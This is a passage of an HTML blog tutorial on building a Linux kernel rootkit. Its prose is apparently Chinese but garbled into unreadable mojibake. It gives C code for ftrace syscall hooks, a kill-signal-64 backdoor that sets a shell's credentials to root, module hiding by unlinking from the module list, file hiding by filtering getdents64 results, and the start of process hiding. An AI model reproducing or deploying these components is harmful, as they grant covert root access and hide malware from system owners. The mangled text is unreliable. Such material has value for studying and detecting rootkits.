class="hljs-string">&quot;__x64_sys_mkdir&quot;</span>, hook_mkdir, &amp;orig_mkdir),<br>    HOOK(<span class="hljs-string">&quot;__x64_sys_getdents&quot;</span>, hook_getdents, &amp;orig_getdents)&#125;;<br>    <br><span class="hljs-comment">//åœ¨æ¨¡å—åˆå§‹åŒ–æ—¶æ‰§è¡Œhookå®‰è£…</span><br>fh_install_hooks(hooks, ARRAY_SIZE(hooks));<br><br><span class="hljs-comment">//åœ¨æ¨¡å—å¸è½½åŒ–æ—¶æ‰§è¡Œhookå¸è½½</span><br>fh_remove_hooks(hooks, ARRAY_SIZE(hooks));<br></code></pre></td></tr></table></figure><p>åœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œ<code>/proc/kallsyms</code>æ–‡ä»¶å­˜å‚¨äº†ç³»ç»Ÿè°ƒç”¨å§å’Œç³»ç»Ÿè°ƒç”¨çš„åœ°å€ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œè·å–ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">cat /proc/kallsyms | grep xxx<br></code></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œå¯¹äºä¸åŒçš„å†…æ ¸ï¼Œç³»ç»Ÿè°ƒç”¨å‡½æ•°çš„å£°æ˜ä¸åŒï¼Œè¿™æ˜¯ä¸€ä¸ªå¯¹æ¯”ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// æ—§</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd, struct linux_dirent *dirp,</span></span><br><span class="hljs-params"><span class="hljs-function">                    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br><br><span class="hljs-comment">// æ–°</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">sys_getdents</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> fd,</span></span><br><span class="hljs-params"><span class="hljs-function">struct linux_dirent __user *dirent,</span></span><br><span class="hljs-params"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> count)</span></span>;<br></code></pre></td></tr></table></figure><p><code>asmlinkage</code>æ˜¯ä¸€ä¸ªå®ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨åœ¨ CPU å †æ ˆä¸ŠæŸ¥æ‰¾å‡½æ•°å‚æ•°ï¼Œè€Œä¸æ˜¯å¯„å­˜å™¨ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œç”¨æˆ·æ€ç¨‹åºè°ƒç”¨syscallçš„æ—¶å€™ï¼Œä¼šä¸‹é™·åˆ°å†…æ ¸æ€ï¼Œæ­¤æ—¶ä¼šä¿å­˜ CPU å †æ ˆä¸­çš„æ‰€æœ‰å¯„å­˜å™¨ï¼ˆeaxã€ebxã€ecx ç­‰ï¼‰ã€‚å› æ­¤ï¼Œä»ç”¨æˆ·ç©ºé—´ä¼ é€’åˆ°å†…æ ¸ç©ºé—´çš„æœ‰å…³å‚æ•°çš„ä¿¡æ¯éƒ½è¢«ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œè¿™ä¹Ÿå³æ˜¯ä½¿ç”¨<code>asmlinkage</code>çš„åŸå› </p><p>å¯¹äºæ–°çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå­˜å‚¨åœ¨å¯„å­˜å™¨ä¸­çš„å‚æ•°ä¼šå…ˆè¢«å¤åˆ¶åˆ°<code>pt_regs</code>ç»“æ„ä½“ä¸­ï¼Œå› æ­¤å½“æˆ‘ä»¬ç¼–å†™hookå‡½æ•°çš„æ—¶å€™ï¼Œéœ€è¦å…ˆä»è¿™ä¸ªç»“æ„ä½“ä¸­è·å–å¯¹åº”çš„å‚æ•°å€¼</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//å‡½æ•°å£°æ˜,hook_sys_openatæˆ‘ä»¬è‡ªå·±å®ç°çš„sys_openatå‡½æ•°</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_sys_openat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br></code></pre></td></tr></table></figure><p>æ­¤å¤–ç”±äºå†…æ ¸ç©ºé—´å’Œç”¨æˆ·ç©ºé—´æ˜¯éš”ç¦»çš„ï¼Œåœ°å€çš„æ˜ å°„å¹¶ä¸äº’é€šï¼Œå› æ­¤éœ€è¦ä½¿ç”¨<code>copy_to_user</code>å’Œ<code>copy_from_user</code>è¿›è¡Œæ•°æ®çš„ä¼ è¾“</p><h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><ul><li><p><code>cred</code>æ˜¯ä¸€ä¸ªè®°å½•è¿›ç¨‹credentialsä¿¡æ¯çš„ç»“æ„ä½“ï¼Œå…·ä½“å®šä¹‰åœ¨<code>cred.c</code>å¤´æ–‡ä»¶ä¸­</p></li><li><p><code>prepare_creds()</code>è¿”å›å½“å‰è¿›ç¨‹çš„<code>cred</code>ç»“æ„</p></li><li><p><code>commit_creds()</code>å°†è¿™ä¸ªcredåº”ç”¨äºå½“å‰è¿›ç¨‹ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦å¯¹credç»“æ„ä½“è¿›è¡Œä¿®æ”¹å³å¯å®ç°ææƒ</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">newcreds</span>;</span><br>    newcreds = prepare_creds();<br>    <span class="hljs-keyword">if</span> (newcreds == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">return</span>;<br>    newcreds-&gt;uid.val = newcreds-&gt;gid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;euid.val = newcreds-&gt;egid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;suid.val = newcreds-&gt;sgid.val = <span class="hljs-number">0</span>;<br>    newcreds-&gt;fsuid.val = newcreds-&gt;fsgid.val = <span class="hljs-number">0</span>;<br>    commit_creds(newcreds);<br>&#125;<br></code></pre></td></tr></table></figure><p>hook killå®ç°ææƒï¼Œå½“æˆ‘ä»¬åœ¨shellä¸­è¾“å…¥kill -64 &lt;num&gt;çš„æ—¶å€™ä¼šå°†shellææƒåˆ°rootï¼Œå¯ä»¥ä½¿ç”¨idå‘½ä»¤éªŒè¯è¿™ä¸€ç‚¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_kill</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">pid_t</span> pid = regs-&gt;di;<br>    <span class="hljs-keyword">int</span> sig = regs-&gt;si;<br>    <span class="hljs-keyword">if</span> (sig == <span class="hljs-number">64</span>)<br>    &#123;<br>        printk(KERN_INFO <span class="hljs-string">&quot; get_root &quot;</span>);<br>        get_root();<br>    &#125;<br>    <span class="hljs-keyword">return</span> orig_kill(regs);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ¨¡å—éšè—"><a href="#æ¨¡å—éšè—" class="headerlink" title="æ¨¡å—éšè—"></a>æ¨¡å—éšè—</h1><p>lsmodå‘½ä»¤å¯ä»¥åˆ—å‡ºå·²å®‰è£…çš„å†…æ ¸æ¨¡å—ï¼Œrmmodå¯ä»¥åˆ é™¤ã€‚æ¨¡å—éšè—ä¹Ÿå³æ˜¯è®©lsmodå‘½ä»¤æ— æ³•è¾“å‡ºæˆ‘ä»¬çš„æ¨¡å—</p><p>å†…æ ¸ä½¿ç”¨moduleç»“æ„ä½“å­˜å‚¨æ¨¡å—ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°moduleå°è£…äº†liståŒå‘é“¾è¡¨ï¼Œä¸‹é¢çš„æºç å¯ä»¥åœ¨<code>module.h</code>ä¸­æ‰¾åˆ°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">module</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">module_state</span> <span class="hljs-title">state</span>;</span><br><br><span class="hljs-comment">/* Member of list of modules */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><br><br><span class="hljs-comment">// ... and so on </span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºäº†éšè—æ¨¡å—ï¼Œæˆ‘ä»¬åªéœ€æŠŠå¯¹åº”rootkitæ¨¡å—çš„listä»å…¨å±€é“¾è¡¨ä¸­åˆ é™¤å³å¯ã€‚å†…æ ¸å·²ç»æ›¿æˆ‘ä»¬å®ç°äº†list_delå’Œlist_addå‡½æ•°ï¼Œå®ƒä»¬è¢«å°è£…åœ¨list.hå¤´æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬è°ƒç”¨å³å¯ã€‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼ŒTHIS_MODULEå®æŒ‡å‘å½“å‰æ¨¡å—çš„module struct</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†æ¢å¤èŠ‚ç‚¹ï¼Œæˆ‘ä»¬éœ€è¦ä¸´æ—¶ä¿å­˜èŠ‚ç‚¹çš„ä¿¡æ¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">hide_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_del(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>);  &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">show_myself</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;  list_add(&amp;THIS_MODULE-&gt;<span class="hljs-built_in">list</span>, module_prev); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">void</span> <span class="hljs-title">module_info</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;   module_prev = THIS_MODULE-&gt;<span class="hljs-built_in">list</span>.prev;  &#125;<br></code></pre></td></tr></table></figure><h1 id="æ–‡ä»¶éšè—"><a href="#æ–‡ä»¶éšè—" class="headerlink" title="æ–‡ä»¶éšè—"></a>æ–‡ä»¶éšè—</h1><p>lså‘½ä»¤å¯ä»¥æ‰“å°å‡ºæ–‡ä»¶ï¼Œä¸ºäº†æ·±å…¥ç ”ç©¶lsåšäº†ä»€ä¹ˆï¼Œå¯ä»¥ä½¿ç”¨straceå‘½ä»¤è¿›è¡Œè¿½è¸ªã€‚straceå…·æœ‰è®¸å¤šæœ‰è¶£çš„é€‰é¡¹ï¼Œæ¯”å¦‚<code>-c</code>å¯ä»¥æ‰“å°å‡ºç»Ÿè®¡è¡¨æ ¼ï¼Œ <code>-p</code>å¯ä»¥è¿½è¸ªæŸä¸€è¿›ç¨‹ï¼Œç­‰ç­‰ </p><p>ä¸€é€šåˆ†æåå¯ä»¥å‘ç°lså‘½ä»¤è°ƒç”¨äº†<code>getdents64 syscall</code>ï¼ˆå®é™…ä¸Šæœ‰äº›è¾ƒæ–°çš„å†…æ ¸ç‰ˆæœ¬ä»ç„¶ä¼šè°ƒç”¨<code>getdents</code>å‡½æ•°è€Œä¸æ˜¯è¾ƒæ–°çš„<code>getdents64</code>ï¼Œè¿™ä¸ªåé¢è¿˜ä¼šæåˆ°ï¼‰ï¼Œè¯¥å‡½æ•°å¯ä»¥å¾—åˆ°ç›®å½•çš„entryï¼Œå¹¶è¿”å›è¯»å–çš„å­—èŠ‚æ•°ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯¹è¯¥å‡½æ•°è¿›è¡Œhookä»è€Œè¾¾åˆ°éšè—æ–‡ä»¶çš„ç›®çš„</p><p>ä¸‹é¢æ˜¯hook_getdents64å‡½æ•°çš„è®¾è®¡ï¼Œçœç•¥äº†ä¸€äº›æŠ¥é”™å¤„ç†å’Œåˆ«çš„ç»†èŠ‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// å£°æ˜åŸæœ¬çš„getdents64å‡½æ•°</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> asmlinkage <span class="hljs-title">long</span> <span class="hljs-params">(*orig_getdents64)</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// å£°æ˜æˆ‘ä»¬è®¾è®¡çš„hook_getdents64å‡½æ•°</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">long</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *)</span></span>;<br><span class="hljs-comment">// ssize_t getdents64(int fd, void *dirp, size_t count);</span><br><span class="hljs-function">asmlinkage <span class="hljs-keyword">int</span> <span class="hljs-title">hook_getdents64</span><span class="hljs-params">(<span class="hljs-keyword">const</span> struct pt_regs *regs)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//è·å–å¯„å­˜å™¨ä¸­çš„å†…å®¹</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> __<span class="hljs-title">user</span> *<span class="hljs-title">dirent</span> =</span> (struct linux_dirent64 *)regs-&gt;si;<br><span class="hljs-comment">//éå†ï¼Œå¯¹å¸Œæœ›éšè—çš„æ–‡ä»¶è¿›è¡Œå¤„ç†</span><br><span class="hljs-keyword">while</span> (tlen &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        len = current_dir-&gt;d_reclen;<br>        tlen = tlen - len;<br>        <span class="hljs-keyword">if</span> (check_file(current_dir-&gt;d_name))<span class="hljs-comment">//è¦†ç›–æ“ä½œ</span><br>        &#123;<br>            ret = ret - len;<br>            memmove(current_dir, (<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen, tlen);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>            current_dir = (struct linux_dirent64 *)((<span class="hljs-keyword">char</span> *)current_dir + current_dir-&gt;d_reclen);<br>    &#125;<br><span class="hljs-comment">//è¿”å›æ­£å¸¸è°ƒç”¨çš„ç»“æœ</span><br><span class="hljs-keyword">return</span> orig_getdents64(regs);<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸ºäº†è®¾è®¡å‡ºä¸Šé¢çš„ä»£ç æˆ‘ä»¬éœ€è¦è¯¦ç»†ç†è§£linux_direntç»“æ„ä½“å’Œlinux_dirent64ç»“æ„ä½“ï¼Œå®ƒä»¬åˆ†åˆ«å¯¹åº”getdentså‡½æ•°å’Œgetdents64å‡½æ•°ï¼Œåè€…æ˜¯ä¸ºäº†å¤„ç†æ›´å¤§çš„æ–‡ä»¶ç³»ç»Ÿå’Œåç§»è€Œè®¾è®¡çš„ï¼Œç»†èŠ‚å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent</span> &#123;</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_ino;     <span class="hljs-comment">/* Inode number */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>  d_off;     <span class="hljs-comment">/* Offset to next linux_dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen;  <span class="hljs-comment">/* Length of this linux_dirent */</span><br>               <span class="hljs-keyword">char</span>           d_name[];  <span class="hljs-comment">/* Filename (null-terminated) */</span><br>                                 <span class="hljs-comment">/* length is actually (d_reclen - 2 -</span><br><span class="hljs-comment">                                    offsetof(struct linux_dirent, d_name)) */</span><br>               <span class="hljs-comment">/*</span><br><span class="hljs-comment">               char           pad;       // Zero padding byte</span><br><span class="hljs-comment">               char           d_type;    // File type (only since Linux</span><br><span class="hljs-comment">                                         // 2.6.4); offset is (d_reclen - 1)</span><br><span class="hljs-comment">               */</span><br>           &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">linux_dirent64</span> &#123;</span><br>               <span class="hljs-keyword">ino64_t</span>        d_ino;    <span class="hljs-comment">/* 64-bit inode number */</span><br>               <span class="hljs-keyword">off64_t</span>        d_off;    <span class="hljs-comment">/* 64-bit offset to next structure */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span> d_reclen; <span class="hljs-comment">/* Size of this dirent */</span><br>               <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>  d_type;   <span class="hljs-comment">/* File type */</span><br>               <span class="hljs-keyword">char</span>           d_name[]; <span class="hljs-comment">/* Filename (null-terminated) */</span><br>           &#125;;<br></code></pre></td></tr></table></figure><p>å¯¹äºgetdentså‡½æ•°çš„hookï¼Œä¸getdents64å‡½æ•°çš„hookæœ‰ä¸€äº›ä¸åŒï¼Œè¿™é‡Œæš‚ä¸”ç•¥å»</p><h1 id="è¿›ç¨‹éšè—"><a href="#è¿›ç¨‹éšè—" class="headerlink" title="è¿›ç¨‹éšè—"></a>è¿›ç¨‹éšè—</h1><p>linuxå†…æ ¸ç»´æŠ¤äº†task_structå’Œpidä¸¤ä¸ªé“¾è¡¨ï¼Œåˆ†å¸ƒè®°å½•äº†è¿›ç¨‹çš„task_structç»“æ„å’Œpidç»“æ„</p><p>æƒ³è¦æŸ¥çœ‹å½“å‰æ˜¯å¦æœ‰rootkitè¿›ç¨‹æœ‰ä¸¤ä¸ªå¸¸è§„æ“ä½œï¼š</p><ul><li>éå†task_structé“¾è¡¨</li><li>éå†/proc/pidä¸­æ‰€æœ‰è¿›ç¨‹</li></ul><p>è¦æƒ³éšè—è¿›ç¨‹ï¼Œå°±è¦è€ƒè™‘å°†rootkitç›¸å…³çš„task structå’Œpidéƒ½æ‘˜é™¤åˆ—è¡¨ï¼Œå³è¦ä»ä¸‹é¢ä¸¤ç‚¹å‡ºå‘ï¼š</p><ul><li><p>è„±ç¦» task_struct é“¾è¡¨</p></li><li><p>è„±ç¦» pid é“¾è¡¨</p></li></ul><p>é‚£ä¹ˆé¦–å…ˆçœ‹ä¸‹linuxä¸­ä½¿ç”¨çš„ç›¸å…³çš„ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">refcount_t</span> count;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> level;<br><span class="hljs-comment">// lists of tasks that use this pid </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span> <span class="hljs-title">tasks</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><br><span class="hljs-comment">// wait queue for pidfd notifications </span><br><span class="hljs-keyword">wait_queue_head_t</span> wait_pidfd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">upid</span> <span class="hljs-title">numbers</span>[1];</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    ......<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>*<span class="hljs-title">thread_pid</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span><span class="hljs-title">pid_links</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><span class="hljs-comment">//æ‰¾task structä¸­çš„å¯¹åº”çš„pid hlist_node</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">thread_group</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">thread_node</span>;</span><br>    ......<br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// #ifdef CONFIG_TASKS_RCU </span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_info</span><span class="hljs-title">sched_info</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">tasks</span>;</span> list_head é€šè¿‡list_headå°†å½“å‰è¿›ç¨‹çš„task_structä¸²è”è¿›å†…æ ¸çš„è¿›ç¨‹åˆ—è¡¨ä¸­<br>    .....<br>    &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> **<span class="hljs-title">pprev</span>;</span><br>    <span class="hljs-comment">//éœ€è¦æ³¨æ„çš„æ˜¯pprevæ˜¯æŒ‡é’ˆçš„æŒ‡é’ˆ,å®ƒæŒ‡å‘çš„æ˜¯å‰ä¸€ä¸ªèŠ‚ç‚¹çš„nextæŒ‡é’ˆï¼›å…¶ä¸­é¦–å…ƒç´ çš„pprevæŒ‡å‘é“¾è¡¨å¤´çš„fistå­—æ®µï¼Œæœ«å…ƒç´ çš„nextä¸ºNULL. </span><br>&#125;;<br></code></pre></td></tr></table></figure><p>ç›¸å…³çš„å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct task_struct *<span class="hljs-title">pid_task</span><span class="hljs-params">(struct pid *pid, <span class="hljs-keyword">enum</span> pid_type type)</span> <span class="hljs-comment">//ç”¨äºæ ¹æ®pidå’Œå…¶ç±»å‹æ‰¾åˆ°å¯¹åº”çš„task_struct</span></span><br><span class="hljs-function"><span class="hljs-title">find_vpid</span><span class="hljs-params">()</span><span class="hljs-comment">//ç”¨äºæ ¹æ®nrä¹Ÿå°±æ˜¯namespaceä¸‹çš„å±€éƒ¨pidæ‰¾åˆ°å¯¹åº”çš„struct pidç»“æ„ä½“</span></span><br><span class="hljs-function"><span class="hljs-comment">//ä½¿ç”¨çš„é“¾è¡¨æ“ä½œç›¸å…³çš„å‡½æ•°</span></span><br><span class="hljs-function"><span class="hljs-title">list_add</span><span class="hljs-params">()</span><span class="hljs-comment">//å¢åŠ ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">list_del</span><span class="hljs-params">()</span><span class="hljs-comment">//åˆ é™¤ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_add_head_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//å¢åŠ ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">list_add_tail_rcu</span><span class="hljs-params">()</span>  <span class="hljs-comment">//å¢åŠ ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">list_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//åˆ é™¤ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//åˆ é™¤ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_HLIST_NODE</span><span class="hljs-params">()</span><span class="hljs-comment">//åˆå§‹åŒ–é“¾è¡¨ç»“ç‚¹</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_LIST_HEAD</span><span class="hljs-params">()</span><span class="hljs-comment">//åˆå§‹åŒ–é“¾è¡¨å¤´</span></span><br><span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span><span class="hljs-params">()</span><span class="hljs-comment">//ç›¸å½“äºéå†æ•´ä¸ªåŒå‘å¾ªç¯é“¾è¡¨,éå†æ—¶ä¼šå­˜ä¸‹ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æ•°æ®ç»“æ„,æ–¹ä¾¿å¯¹å½“å‰é¡¹è¿›è¡Œåˆ é™¤</span></span><br><span class="hljs-function"><span class="hljs-comment">//å†…å­˜æ“ä½œ</span></span><br><span class="hljs-function"><span class="hljs-title">kmalloc</span><span class="hljs-params">()</span><span class="hljs-comment">//ç”³è¯·å†…å­˜å­˜å‚¨hide_nodeç»“æ„</span></span><br><span class="hljs-function"><span class="hljs-title">kfree</span><span class="hljs-params">()</span><span class="hljs-comment">//é‡Šæ”¾hide_nodeç»“æ„å ç”¨çš„å†…å­˜</span></span><br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰çš„æ•°æ®ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//è¿›ç¨‹éšè—çš„å­˜å‚¨é“¾è¡¨</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span 